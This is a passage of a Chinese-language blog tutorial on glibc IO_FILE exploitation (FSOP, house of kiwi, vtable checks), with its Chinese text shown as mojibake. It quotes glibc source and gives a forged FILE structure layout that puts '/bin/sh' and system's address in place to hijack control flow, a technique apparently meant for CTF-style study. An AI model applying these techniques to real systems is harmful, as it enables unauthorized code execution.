__pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Ê≥®ÊÑèÔºåÁ®ãÂ∫è‰∏≠Â≠òÂú®ÂæàÂ§ö<code>_IO_jump_t</code>ÁªìÊûÑ‰ΩìÔºå‰∏çÂêåÁöÑ<code>_IO_FILE_plus</code>ÂèØËÉΩÈááÁî®‰∏çÂêåÁöÑ<code>_IO_jump_t</code>Ôºå‰æãÂ¶Çstdin&#x2F;stdout&#x2F;stderr‰ΩøÁî®<code>_IO_file_jumps</code>ÔºåÂèØ‰ª•ÈÄöËøágdbÊü•Áúã</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811182023451.png" alt="image-20230811182023451"></p><h1 id="FSOPÂü∫Á°Ä"><a href="#FSOPÂü∫Á°Ä" class="headerlink" title="FSOPÂü∫Á°Ä"></a>FSOPÂü∫Á°Ä</h1><p><strong>FSOP</strong>(File Stream Oriented ProgrammingÊòØÈíàÂØπ<code>_IO_FILE</code>ÁªìÊûÑ‰Ωì‰∏éIOÊìç‰ΩúÁöÑÊîªÂáªÊñπÂºè</p><p>ÈÄöÂ∏∏ÂèØ‰ª•ÂàÜ‰∏∫‰∏§‰∏™Ê≠•È™§Ôºö<strong>Âä´ÊåÅ</strong>Âπ∂<strong>‰º™ÈÄ†</strong>IOÁªìÊûÑ‰Ωì„ÄÅ<strong>Ëß¶Âèë</strong>IOÊµÅ</p><p>Âõ†‰∏∫Ëß¶ÂèëIOÊµÅÁöÑÊñπÂºèÂΩ±ÂìçÁ®ãÂ∫èËøõÂÖ•ÁöÑIOÁªìÊûÑ‰ΩìÔºåÊâÄ‰ª•Êàë‰ª¨ÂÖàËÆ≤Â¶Ç‰ΩïËß¶ÂèëIOÊµÅ</p><h2 id="Ëß¶ÂèëIOÊµÅ"><a href="#Ëß¶ÂèëIOÊµÅ" class="headerlink" title="Ëß¶ÂèëIOÊµÅ"></a>Ëß¶ÂèëIOÊµÅ</h2><p>Ëß¶ÂèëIOÊµÅÁöÑÊñπÂºè‰∏ªË¶ÅÂàÜ‰∏∫‰∏§ÁßçÔºö<strong>FSOP</strong>ÁöÑÁªèÂÖ∏ÊñπÂºèÂíå<strong>house of kiwi</strong>ÁöÑÊñπÂºè</p><h3 id="FSOP-IO-flush-all-lockp"><a href="#FSOP-IO-flush-all-lockp" class="headerlink" title="FSOP - _IO_flush_all_lockp()"></a>FSOP - _IO_flush_all_lockp()</h3><p>ËØ•ÂáΩÊï∞ÁöÑË∞ÉÁî®Êúâ‰ª•‰∏ã‰∏âÁßçËß¶ÂèëÊñπÂºèÔºö</p><ol><li><code>libc</code>Ê£ÄÊµãÂà∞<strong>ÂÜÖÂ≠òÈîôËØØ</strong>Ôºå‰ªéËÄåÊâßË°å<code>abort</code>ÂáΩÊï∞Êó∂ÔºàÂú®<code>glibc-2.26</code>Âà†Èô§Ôºâ</li><li>Á®ãÂ∫èÊâßË°å<code>exit</code>ÂáΩÊï∞</li><li>Á®ãÂ∫è‰ªémainÂáΩÊï∞ËøîÂõûÔºàÂêåÊ†∑ÊòØÊâßË°åexitÔºâ</li></ol><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÈ´òÁâàÊú¨‰∏ãÔºåÂü∫Êú¨ÁöÑËß¶ÂèëÊñπÂºèÈÉΩÊòØÈÄöËøá<code>exit</code>ÂáΩÊï∞ÔºåÂÖ∂Ê†àÂõûÊ∫Ø‰∏∫Ôºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br></pre></td></tr></table></figure><p>Â∞±ËÉΩË∞ÉÁî®Âà∞<code>_IO_flush_all_lockp()</code>ÂáΩÊï∞</p><p>ËØ•ÂáΩÊï∞ÁöÑ‰ª£Á†ÅÁâáÊÆµÂ¶Ç‰∏ãÔºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"> </span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"> </span><br><span class="line">    fp = fp-&gt;_chain; <span class="comment">//ÈÅçÂéÜÈìæË°®</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÂú®ÁªèÂéÜ‰∏ÄÁ≥ªÂàóÊù°‰ª∂Âà§Êñ≠ÂêéÔºåÁ®ãÂ∫è‰ºöË∞ÉÁî®ËôöË°®‰∏≠ÁöÑ<code>_IO_OVERFLOW</code> ÂáΩÊï∞ÔºåËÄåËôöË°®ÊåáÈíàÊòØÂèØ‰ª•Áî±Êàë‰ª¨‰º™ÈÄ†ÁöÑ„ÄÇÊâÄ‰ª•ÂêàÁêÜÂ∏ÉÂ±ÄÔºåËß¶ÂèëËØ•ÂáΩÊï∞ÔºåÂ∞±ËÉΩËøõÂÖ•Êàë‰ª¨‰º™ÈÄ†ÁöÑÊâßË°åÊµÅ„ÄÇ</p><p>‰∏ãÈù¢ËÆ≤Â¶Ç‰ΩïËææÊàêË∞ÉÁî®<code>_IO_OVERFLOW</code>ÂáΩÊï∞ÁöÑÊù°‰ª∂Ôºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>Ê†πÊçÆÁü≠Ë∑ØÂéüÂàôÔºåÊâßË°å<code>_IO_OVERFLOW</code>ÈúÄË¶ÅÊª°Ë∂≥ÂâçÈù¢ÁöÑÊù°‰ª∂‰∏∫ÁúüÔºåËøôÈáåÊúâ‰∏Ä‰∏™ÊàñËØ≠Âè•ÔºåÊïÖÊúâ‰∏§ÁßçËææÊàêÊù°‰ª∂ÔºåÊª°Ë∂≥‰ªª‰∏ÄÂç≥ÂèØÔºö</p><p>1.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><p>   ËøôÊòØËæÉ‰∏∫Â∏∏Áî®ÁöÑËææÊàêÊù°‰ª∂ÔºåÂè™ÈúÄ‰º™ÈÄ†<code>_IO_FILE</code>‰∏≠ÁöÑ<code>_IO_write_ptr</code>„ÄÅ<code>_IO_write_base</code>Âíå<code>_mode</code>Âç≥ÂèØËææÊàê</p><p>2.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">fp-&gt;_mode &gt; <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><p>   ËØ•Êù°‰ª∂ÂèØ‰ª•ÁªìÂêà<strong>house of cat</strong>‰ΩøÁî®„ÄÇÂÖ∂‰∏≠<code>_IO_vtable_offset (fp) == 0</code> Âç≥ <code>_vtable_offset</code>‰∏∫0ÔºåÂè¶Â§ñÈúÄË¶ÅÂÖ≥Ê≥®<code>_wide_data</code>ÁªìÊûÑ‰ΩìÔºåËØ•ÊâãÊ≥ï‰ºöÂú®house of cat‰∏≠ËÆ≤Ëß£</p><p>Êù°‰ª∂Êª°Ë∂≥ÂêéÔºå‰ºö‰ªé<code>_IO_list_all</code>ÂºÄÂßãÊ≤øÁùÄ<code>fp -&gt; chain</code>ÈÅçÂéÜFILEÁªìÊûÑ‰ΩìÔºåÊâßË°åÂØπÂ∫îËôöË°®‰∏≠ÁöÑ<code>_IO_OVERFLOW</code>ÔºåÂç≥<code>&lt;_IO_file_jumps+24&gt;</code></p><h3 id="house-of-kiwi-malloc-assert"><a href="#house-of-kiwi-malloc-assert" class="headerlink" title="house of kiwi - __malloc_assert"></a>house of kiwi - __malloc_assert</h3><p>ËØ•ÊâãÊ≥ïÁî®‰∫éÂú®Á®ãÂ∫èÊó†<code>exit</code>Êó∂Ëß¶ÂèëIOÔºå‰∏îËÉΩÊéßÂà∂<code>rdx</code></p><p>‰ª•‰∏ã‰∏∫<code>__malloc_assert</code>ÁöÑ‰ª£Á†ÅÁâáÊÆµ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËØ•ÂáΩÊï∞Ë∞ÉÁî®ÁöÑ<code>__fxprintf</code>„ÄÅ<code>fflush</code>ÈÉΩËÉΩË∞ÉÁî®ËôöË°®‰∏≠ÂáΩÊï∞ÔºåÊúâÂä´ÊåÅÁöÑÂèØËÉΩ„ÄÇ</p><p>‰ª•‰∏ãÊòØËøõÂÖ•<code>__malloc_assert</code>ÁöÑÊñπÊ≥ï</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>‰∏çÊª°Ë∂≥‰ª•‰∏ãÊù°‰ª∂‰ªª‰∏ÄÂç≥ÂèØËøõÂÖ•Ôºö</p><ol><li><code>old_size &gt;=MINSIZE</code></li><li><code>old_top.pre_inuse = 0</code></li><li><code>old_topÈ°µÂØπÈΩê</code></li></ol><p>ÈÄöÂ∏∏Áî®ÁöÑÊØîËæÉÂ§öÁöÑÊòØÁ¨¨‰∏âÁßçÔºåÂõ†‰∏∫È°µÂØπÈΩêÊù°‰ª∂ËæÉËãõÂàªÔºåÈÄöÂ∏∏‰øÆÊîπtopchunkÁöÑsizeÈÉΩËÉΩ‰∏çÂØπÈΩê„ÄÇÊ≥®ÊÑè<strong>‰∏çËÉΩÊîπÁöÑÂ§™Â§ß</strong>ÔºåÂê¶Âàô‰ºöËøõÂÖ•Âà´ÁöÑassert„ÄÇËøôÈáå‰øÆÊîπÁöÑÊñπÂºè‰∏ÄËà¨ÊòØÊûÑÈÄ†<strong>Â†ÜÈáçÂè†</strong>Êàñ<strong>largebin attack</strong></p><p>Êé•‰∏ãÊù•ËÆ≤ÂáΩÊï∞ÁöÑË∞ÉÁî®ÈìæÔºåËøôÈáåÂàÜ<code>__fxprintf</code>Âíå<code>fflush</code>‰∏§ÁßçÊñπÂºè</p><h4 id="fxprintf"><a href="#fxprintf" class="headerlink" title="__fxprintf"></a>__fxprintf</h4><p>Ë∞ÉÁî®Èìæ‰∏∫</p><p><code>__fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn </code></p><p>ÈúÄË¶ÅÊª°Ë∂≥ÁöÑÊù°‰ª∂‰∏∫Ôºö</p><ol><li><code>_IO_write_ptr</code> &gt; <code>_IO_write_base</code></li><li><code>_lock</code>ÊåáÂêëÂèØÂÜôÂú∞ÂùÄ</li></ol><p>Ë∞ÉÁî®ÂêéÔºå‰ªÖÂà∑Êñ∞<code>stderr</code>ÔºåË∞ÉÁî®ËôöË°®<code>_IO_file_jumps</code>‰∏≠ÁöÑ<code>_IO_new_file_xsputn</code>ÔºåÂç≥<code>&lt;_IO_file_jumps+56&gt;</code></p><h4 id="fflush"><a href="#fflush" class="headerlink" title="fflush"></a>fflush</h4><p><code>fflush(stderr) =&gt; _IO_file_jumps =&gt; sync</code></p><p>Áî®ÁöÑÊØîËæÉÂ∞ëÔºåÊ≤°‰ªÄ‰πàÊù°‰ª∂„ÄÇ‰ΩÜÊòØÂõ†‰∏∫Âú®<code>__fxprinf</code>‰πãÂêéÔºåÊâÄ‰ª•ÈúÄË¶Å‰øùËØÅ<code>__fxprinf</code>‰∏ç‰ºöÊåÇÊéâ„ÄÇ</p><p>Â•ΩÂ§ÑÊòØÈÄöËøáËøôÊù°Ë∞ÉÁî®ÈìæÔºåÂú®Ë∞ÉÁî®<code>sync</code>Êó∂ÁöÑ<code>rdx</code>Âõ∫ÂÆöÔºåÈÉΩÊòØ<code>IO_helper_jumps</code>ÔºåÂèØ‰ª•ÁªìÂêàÂêéÈù¢ËÆ≤Âà∞ÁöÑ<code>&lt;setcontext+61&gt;</code>Âà©Áî®„ÄÇ‰∏çËøáÈ´òÁâàÊú¨‰∏≠Âä†ÂÖ•ËôöË°®Ê£ÄÊµãÔºåËøôÁßçÂà©Áî®ÂèòÂæóÂõ∞Èöæ</p><h2 id="‰º™ÈÄ†FILEÁªìÊûÑ‰Ωì"><a href="#‰º™ÈÄ†FILEÁªìÊûÑ‰Ωì" class="headerlink" title="‰º™ÈÄ†FILEÁªìÊûÑ‰Ωì"></a>‰º™ÈÄ†FILEÁªìÊûÑ‰Ωì</h2><p>Â¶Ç‰ΩïËÆ©Êàë‰ª¨‰º™ÈÄ†ÁöÑFILEÁªìÊûÑ‰ΩìÂú®Ëß¶ÂèëIOÊó∂Ë¢´Âà∑Êñ∞Ôºü</p><p>Â¶ÇÊûú‰ΩøÁî®<strong>FSOP</strong>ÁöÑÊñπÂºèÔºåÁ®ãÂ∫è‰ªé<code>_IO_list_all</code>ÂºÄÂßãÊ≤øÁùÄ<code>fp -&gt; chain</code>ÈÅçÂéÜ„ÄÇÊïÖÊàë‰ª¨ÂèØ‰ª•‰øÆÊîπ<code>_IO_list_all</code>ÊåáÈíàÔºåÊåáÂêëÊàë‰ª¨‰º™ÈÄ†ÁöÑÁªìÊûÑ‰ΩìÔºåÂ¶ÇÊûú‰ΩøÁî®largebin attackÂ∞±ÂèØ‰ª•‰∏ÄÊ≠•Âà∞‰ΩçÊåáÂêëÂ∏ÉÁΩÆÂú®chunk‰∏äÁöÑ‰º™ÈÄ†ÁªìÊûÑ‰Ωì„ÄÇÂêåÊó∂ËøòÂèØ‰ª•‰øÆÊîπ<code>_chain</code>ÊåáÈíàÔºåÂä´ÊåÅÂà∞Â§ö‰∏™‰º™ÈÄ†ÁöÑÁªìÊûÑ‰ΩìÁöÑÂà©Áî®Èìæ</p><p>Â¶ÇÊûú‰ΩøÁî®<strong>house of kiwi</strong>ÁöÑÊñπÂºèÔºåÁ®ãÂ∫è‰ªÖÂà∑Êñ∞<code>stderr</code>ÔºåÂèØ‰ª•‰øÆÊîπ<code>stderr</code>ÊåáÈíàÔºàÂ¶ÇÊûúÂèØÂÜôÔºâÔºåÁîöËá≥Áõ¥Êé•‰øÆÊîπ<code>_IO_2_1_stderr</code>ÁöÑÂÜÖÂÆπ</p><p>‰º™ÈÄ†FILEÁöÑÊâãÊ≥ïÁπÅÂ§öÔºåËøôÈáå‰∏æÂá∫ÊúÄÂéüÂßãÁöÑ‰∏ÄÁßçÊâãÊ≥ï‰Ωú‰∏∫‰æãÂ≠ê</p><h3 id="‰∏äÂè§Êó∂ÊúüÁöÑFSOP-Glibc"><a href="#‰∏äÂè§Êó∂ÊúüÁöÑFSOP-Glibc" class="headerlink" title="‰∏äÂè§Êó∂ÊúüÁöÑFSOP(Glibc&lt;2.24)"></a>‰∏äÂè§Êó∂ÊúüÁöÑFSOP(Glibc&lt;2.24)</h3><p>Âõ†‰∏∫Ëß¶ÂèëFSOPÊó∂Ôºå‰ºöË∞ÉÁî®ËôöË°®‰∏≠<code>&lt;_IO_file_jumps+24&gt;</code>Â§ÑÁöÑ<code>__overflow</code>ÂáΩÊï∞ÔºåÊàë‰ª¨Âè™ÈúÄÊääËØ•‰ΩçÁΩÆÂ°´ÂÖ•<code>system</code>ÁöÑÂú∞ÂùÄ„ÄÇÂΩìÁÑ∂ÔºåËôöË°®‰∏çÂèØÂÜôÔºåÊàë‰ª¨ÂèØ‰ª•Â∞Ü<code>vtable</code>Â§ÑÊîπ‰∏∫Êàë‰ª¨‰º™ÈÄ†ÁöÑËôöË°®„ÄÇÂêåÊó∂Ê≠§Êó∂ÁöÑ<code>rdi</code>ÊåáÂêëFILEÁªìÊûÑ‰ΩìÁöÑ<code>_flags</code>ÔºåÊâÄ‰ª•ÂèØ‰ª•Â∞ÜËØ•‰ΩçÁΩÆÂ°´‰∏ä<code>/bin/sh</code></p><p>ÊûÑÈÄ†ÊñπÂºèÂ¶Ç‰∏ãÔºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr1</span><br><span class="line">chunk_addr1</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="comment">//ÂØπÂ∫îÊ≠§ÁªìÊûÑ‰ΩìÈ¶ñÂú∞ÂùÄ(fp)</span></span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//‰∏ÄËà¨‰∏çÁî®ÁâπÊÑèËÆæÁΩÆ</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = chunk_addr2</span><br><span class="line">&#125;</span><br><span class="line">chunk_addr2</span><br><span class="line">&#123;</span><br><span class="line">  __dummy = <span class="number">0x0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0x0</span>,</span><br><span class="line">  __finish = <span class="number">0x0</span>,</span><br><span class="line">  __overflow = system_addr,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âπ≤ÂáÄÂèàÂç´Áîü</p><h3 id="ËôöË°®ÂÅèÁßªÊó∂‰ª£-Glibc-2-24"><a href="#ËôöË°®ÂÅèÁßªÊó∂‰ª£-Glibc-2-24" class="headerlink" title="ËôöË°®ÂÅèÁßªÊó∂‰ª£(Glibc&gt;&#x3D;2.24)"></a>ËôöË°®ÂÅèÁßªÊó∂‰ª£(Glibc&gt;&#x3D;2.24)</h3><p>Âä†ÂÖ•‰∫ÜÂØπËôöË°®ÁöÑÊ£ÄÊü•<code>IO_validate_vtable()</code>‰∏é<code>IO_vtable_check()</code>ÔºåËã•Êó†Ê≥ïÈÄöËøáÊ£ÄÊü•ÔºåÂàô‰ºöÊä•ÈîôÔºö<code>Fatal error: glibc detected an invalid stdio handle</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t * <span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="comment">//Ê£ÄÊü•vtableÊåáÈíàÊòØÂê¶Âú®glibcÁöÑvtableÊÆµ‰∏≠„ÄÇ</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>glibc‰∏≠Êúâ‰∏ÄÊÆµÂÆåÊï¥ÁöÑÂÜÖÂ≠òÂ≠òÊîæÁùÄÂêÑ‰∏™<code>vtable</code>ÔºåÂÖ∂‰∏≠<code>__start___libc_IO_vtables</code>ÊåáÂêëÁ¨¨‰∏Ä‰∏™<code>vtable</code>Âú∞ÂùÄ<code>_IO_helper_jumps</code>ÔºåËÄå<code>__stop___libc_IO_vtables</code>ÊåáÂêëÊúÄÂêé‰∏Ä‰∏™<code>vtable</code> <code>_IO_str_chk_jumps</code>ÁªìÊùüÁöÑÂú∞ÂùÄ„ÄÇËã•ÊåáÈíà‰∏çÂú®glibcÁöÑ<code>vtable</code>ÊÆµÔºå‰ºöË∞ÉÁî®<code>_IO_vtable_check()</code>ÂÅöËøõ‰∏ÄÊ≠•Ê£ÄÊü•Ôºå‰ª•Âà§Êñ≠Á®ãÂ∫èÊòØÂê¶‰ΩøÁî®‰∫ÜÂ§ñÈÉ®ÂêàÊ≥ïÁöÑ<code>vtable</code>ÔºàÈáçÊûÑÊàñÊòØÂä®ÊÄÅÈìæÊé•Â∫ì‰∏≠ÁöÑ<code>vtable</code>ÔºâÔºåÂ¶ÇÊûú‰∏çÊòØÂàôÊä•Èîô„ÄÇ</p><p>2.37‰ª•ÂâçÊúâ‰ª•‰∏ãËôöË°®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_cookie_jumps</span><br><span class="line">_IO_proc_jumps</span><br><span class="line">_IO_str_chk_jumps</span><br><span class="line">_IO_wstrn_jumps</span><br><span class="line">_IO_wstr_jumps</span><br><span class="line">_IO_wfile_jumps_maybe_mmap</span><br><span class="line">_IO_wfile_jumps_mmap</span><br><span class="line">__GI__IO_wfile_jumps</span><br><span class="line">_IO_wmem_jumps</span><br><span class="line">_IO_mem_jumps</span><br><span class="line">_IO_strn_jumps</span><br><span class="line">_IO_obstack_jumps</span><br><span class="line">_IO_file_jumps_maybe_mmap</span><br><span class="line">_IO_file_jumps_mmap</span><br><span class="line">__GI__IO_file_jumps</span><br><span 